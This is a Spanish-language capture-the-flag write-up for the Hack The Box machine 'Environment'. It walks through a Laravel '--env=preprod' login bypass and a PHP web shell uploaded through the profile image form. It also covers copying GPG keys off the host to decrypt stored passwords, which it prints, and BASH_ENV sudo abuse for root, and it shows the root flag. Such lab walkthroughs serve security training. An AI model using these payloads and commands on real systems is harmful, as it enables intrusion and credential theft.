	Lo que primero realizamos es un ping dentro de la maquina para ver si está activa y enviando paquetes

ping 10.10.11.67

Luego realizamos un escaneo de puertos:
`nmap -v -sC -sV -T5 --min-rate 5000 10.10.11.67 -oX enviromentscan.xml && xsltproc enviromentscan.xml -o escaneo.html`

Obtenemos lo siguiente:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

![[/images/Pasted image 20250504224043.png]]

Tenemos dentro de la maquina un apartado de pagina web
![[remote-blog/images/Pasted image 20250504224324.png]]

De la misma manera tenemos un apartado donde podemos poner nuestro correo

![[remote-blog/images/Pasted image 20250504224353.png]]

Con el comando de gobuster
`gobuster dir -u http://environment.htb -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt`
encontramos algunas rutas
```
/favicon.ico          (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 4602]
/index.php            (Status: 200) [Size: 4602]
/login                (Status: 200) [Size: 2391]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/mailing              (Status: 405) [Size: 244854]
/robots.txt           (Status: 200) [Size: 24]
/robots.txt           (Status: 200) [Size: 24]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2125]
/upload               (Status: 405) [Size: 244852]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
```
Hay rutas interesantes como el de up y upload
![[remote-blog/images/Pasted image 20250504225538.png]]
Acá podemos obtener la version del php y laravel
PHP: 8.2.28
Laravel: 11.30.0

Buscamos algunas vulnerabilidades
# Análisis Técnico de la Solicitud HTTP en Laravel

## Explicación de la Solicitud Modificada

### 1. Línea de Método HTTP

http

Copy

Download

POST /login?--env=preprod HTTP/1.1

Esta es una modificación interesante que intenta:

- **Método POST**: Normal para formularios de login
    
- **Parámetro inusual `--env=preprod`**: Posible intento de:
    
    - Forzar un entorno específico (preproducción)
        
    - Explotar una vulnerabilidad de configuración
        
    - Bypass de validación mediante parámetros inesperados
        

En Laravel, esto podría relacionarse con:

- Manipulación del entorno de ejecución (`.env`)
    
- Intento de acceder a configuraciones de preproducción que podrían tener controles de seguridad relajados
    
### 2. Cabeceras HTTP Relevantes

http

Copy

Download

Cookie: XSRF-TOKEN=eyJpdiI6...; laravel_session=eyJpdiI6...

- **XSRF-TOKEN**: Token de protección CSRF de Laravel (codificado en base64)
    
- **laravel_session**: Identificador de sesión del servidor
    
### 3. Cuerpo de la Solicitud (Datos POST)

http

Copy

Download
_token=IHQIRpVsvlNct9nW1jFAOlWBLtJTlZ9F5BwBnmSG&email=hola%40hola&password=hola&remember=False

- **`_token`**: Token CSRF para protección contra ataques entre sitios
    
- **`email` y `password`**: Credenciales de prueba
    
- **`remember`**: Bandera para "recordar sesión"
    

## Técnicas de Explotación Intentadas

### A. Manipulación de Entorno (`--env=preprod`)

Esta técnica intenta:

1. Forzar la aplicación a usar configuración de preproducción
    
2. Posiblemente acceder a:
    
    - Credenciales por defecto
        
    - Modos debug activados
        
    - Características no disponibles en producción
        

### B. Uso de Tokens Válidos

Los tokens presentes indican:

- Sesión activa válida
    
- Posibilidad de reutilización de sesión
    

## Documentación Técnica para tu Reporte

markdown

Copy

Download

# Análisis de Intento de Bypass de Autenticación

## Solicitud HTTP Analizada
- **Método**: POST con parámetro inusual
- **URL**: `/login?--env=preprod`
- **Técnica intentada**: Manipulación de entorno de ejecución

## Componentes Clave:
1. **CSRF Protection**:
   - Token presente en formulario y cookies
   - Validación doble (header y parámetro POST)

2. **Manipulación de Entorno**:
   - Intento de forzar entorno `preprod`
   - Posible búsqueda de configuraciones menos seguras

3. **Mecanismos de Defensa Detectados**:
   - Validación estricta de credenciales
   - Rechazo de parámetros inusuales en URL

## Conclusión:
La aplicación demostró resistencia a:
- Inyección SQL básica
- Manipulación de entorno
- Reutilización de sesión activa

Recomendaciones:
1. Implementar WAF para bloquear parámetros inusuales
2. Monitorizar accesos a rutas con parámetros de entorno
3. Revisar configuraciones de entornos no productivos

## ¿Qué Pruebas Adicionales Realizar?

1. **Fuerza Bruta Controlada**:
    
    http
    
    Copy
    
    Download
    
    POST /login HTTP/1.1
    Host: environment.htb
    Content-Type: application/x-www-form-urlencoded
    
    _token=[VALID_TOKEN]&email=admin@environment.htb&password=Password123&remember=False
    
2. **Explotación de Debug Mode**:
    
    http
    
    Copy
    
    Download
    
    GET /_ignition/execute-solution HTTP/1.1
    Host: environment.htb
    
3. **Acceso a Archivos de Configuración**:
    
    http
    
    Copy
    
    Download
    
    GET /.env HTTP/1.1
    Host: environment.htb

Una vez hemos puesto lo siguiente al inicio del post

![[remote-blog/images/Pasted image 20250504232502.png]]

/login?--env=preprod HTTP/1.1

Podremos entrar dentro de la pagina y somos el usuario hish
![[remote-blog/images/Pasted image 20250504232527.png]]

![[remote-blog/images/Pasted image 20250504235451.png]]

<?php system($_REQUEST['cmd']); ?>

### Entrando dentro de la maquina
![[remote-blog/images/Pasted image 20250505214947.png]]
Dentro del apartado del profile, podemos encontrar una vulnerabilidad de subida de imagen, en este caso queremos capturar la subida del archivo (solo permite jpeg ya que LARAVEL permite esto)

Ponemos a capturar con el Burpsuite dentro del profile al momento de hacer upload y obtenemos lo siguiente

![[remote-blog/images/Pasted image 20250505220837.png]]
Podemos ver que hemos capturado el packete de la subida de nuestra imagen y ahora lo que vamos a realizar es poner nuestra rev shell

Por lo que realizamos lo siguiente
Primero mandamos a nuestro packet dentro del repeater -> esto para ir probando constantemente 
Luego eliminamos todo lo que tenga que ver con respecto a la imagen (desde la linea 26 para abajo) y la reemplazamos con nuestra propia rev shell

![[remote-blog/images/Pasted image 20250505221018.png]]

Quedaría algo así y lo más importante es reemplazar el nombre del filename para hacer que nuestra rev shell se sube sin ningun tipo de problema
Por lo que realizamos un character inyection

![[remote-blog/images/Pasted image 20250505221110.png]]

![[remote-blog/images/Pasted image 20250505221120.png]]

Verificamos que está bien puesto el filename y la rev shell y mandamos el paquete, por lo que de la misma manera activamos nuestro listener dentro de nuesta maquina y ya estamos dentro de la maquina siendo usuario www-data

![[remote-blog/images/Pasted image 20250505221641.png]]

Una vez dentro, buscamos al user
![[remote-blog/images/Pasted image 20250505222059.png]]
para poner la terminal persistente una vez dentro, eso va a ser que no se cierre la sesion tan rapidamente:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

dentro de esto tenemos que descargar dentro de nuestra maquina local el archivo .gnupg y el archivo keyvault.gpg (esto se encuentra dentro de la carpeta del hish)

abrimos un servidor python dentro del servidor de environment
`python -m http.server 8500` -> en este caso elegimos el puerto que queremos en el cual podemos descargar

y luego procedemos a la descarga de los archivos desde nuestra maquina local, haciendo un wget

`wget http://10.10.11.67:8500/keyvault.gpg`
`wget http://10.10.11.67:8500/.gnupg`

el archivo .gnupg es crucial para poder descencriptar los datos dentro del keyvault.gpg

por lo que procedemos a realizar lo siguiente dentro de nuestra maquina local
rm -rf ~/.gnupg
mv .gnupg ~/.gnupg
chmod 700 ~/.gnupg
gpg --decrypt keyvault.gpg

una vez realizado eso aparecerá como en la imagen de abajo, pero tambien se puede hacer de manera rapida y efectiva simplemente haciendo esto dentro de la maquina 

`cp -R .gnupg /tmp && GNUPGHOME=/tmp/.gnupg gpg --decrypt backup/keyvault.gpg`

![[remote-blog/images/Pasted image 20250505233831.png]]
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!

luego dentro de esto necesitamos realizar un escalado de privielgios, si hacemos un 
`sudo -l`

en este caso obtenemos un binario disfrazado de SCRIPT
``` bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo

```

por lo cual procedemos a hacer un PATH HIJACKING

```bash
hish@environment:~$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > root.sh
hish@environment:~$ ls
backup  root.sh  user.txt
hish@environment:~$ sudo BASH_ENV=root.sh /usr/bin/systeminfo
[sudo] password for hish: 
```

luego de eso ponemos la contraseña y ejecutamos el comando /bin/bash -p

``` bash
hish@environment:~$ /bin/bash -p
bash-5.2# ls
backup  root.sh  user.txt
bash-5.2# cd ..
bash-5.2# sl
bash: sl: command not found
bash-5.2# ls
hish
bash-5.2# ls
hish
bash-5.2# ls
hish
bash-5.2# cd ..
bash-5.2# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
bash-5.2# cd root
bash-5.2# ls
root.txt  scripts
bash-5.2# cat root.txt
5bb677d4147fc7840c2d52a21ec4b3e5
bash-5.2# 

```

Aquí tienes un resumen paso a paso de cómo llegamos al root en este ejercicio:

### 1. **Identificar los comandos sudo disponibles**

Ejecutamos el comando `sudo -l` para ver qué comandos podemos ejecutar con privilegios elevados:

```bash
hish@environment:~$ sudo -l
```

El resultado muestra que podemos ejecutar el siguiente comando como root:

```bash
(ALL) /usr/bin/systeminfo
```

### 2. **Realizar un Path Hijacking**

Dado que `systeminfo` se puede ejecutar como root, intentamos manipular la variable de entorno `BASH_ENV` para que se ejecute un script con privilegios elevados. Creamos un script que cambia el bit SUID de `/bin/bash` para obtener acceso root:

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > root.sh
```

Este script cambiará el bit SUID de `/bin/bash`, lo que permitirá que se ejecute como root en cualquier contexto.

### 3. **Ejecutar el script usando `sudo`**

Luego, ejecutamos el comando `systeminfo` de la siguiente manera, utilizando la variable de entorno `BASH_ENV` para ejecutar el script `root.sh`:

```bash
sudo BASH_ENV=root.sh /usr/bin/systeminfo
```

Este comando ejecuta el script con privilegios elevados, que establece el bit SUID en `/bin/bash`.

### 4. **Obtener acceso a una shell root**

Ahora que hemos manipulado el bit SUID, podemos obtener acceso como root ejecutando `/bin/bash -p`, lo que nos da una shell de root sin la necesidad de ingresar una contraseña:

```bash
/bin/bash -p
```

En este punto, ahora estamos en un shell con privilegios de root. Verificamos que tenemos acceso a las carpetas del sistema, como `/root`, y conseguimos el archivo `root.txt`:

```bash
cat /root/root.txt
```

### 5. **Resultado final**

Al ejecutar `cat /root/root.txt`, obtuvimos el contenido del archivo `root.txt`, lo que confirma que hemos escalado con éxito a privilegios de root y hemos completado el objetivo:

```bash
5bb677d4147fc7840c2d52a21ec4b3e5
```

Este procedimiento describe cómo aprovechamos una vulnerabilidad en la configuración de `sudo` para ejecutar un script personalizado que modifica los permisos del sistema y nos da acceso completo a la cuenta root.